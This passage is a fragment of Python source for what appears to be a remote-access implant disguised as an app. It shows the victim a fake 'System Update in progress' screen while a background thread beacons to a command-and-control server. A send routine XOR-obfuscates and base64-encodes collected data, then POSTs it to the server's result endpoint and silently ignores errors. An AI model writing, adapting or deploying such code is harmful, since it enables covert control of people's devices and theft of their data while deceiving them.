        self.TASK_URL = f"{self.C2_URL}/file"
        self.RESULT_URL = f"{self.C2_URL}/rfile"

        threading.Thread(target=self.beacon_loop, daemon=True).start()
        return Label(text='System Update in progress...\nPlease wait.')

    def _xor(self, data, key):
        if isinstance(data, str):
            data = data.encode('utf-8', errors='ignore')
        return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])

    def _send(self, data):
        try:
            from urllib.request import Request, urlopen
            enc = base64.b64encode(self._xor(data, self.XOR_KEY))
            req = Request(self.RESULT_URL, data=enc, method='POST')
            with urlopen(req, timeout=10) as response:
                pass
        except Exception:
            pass

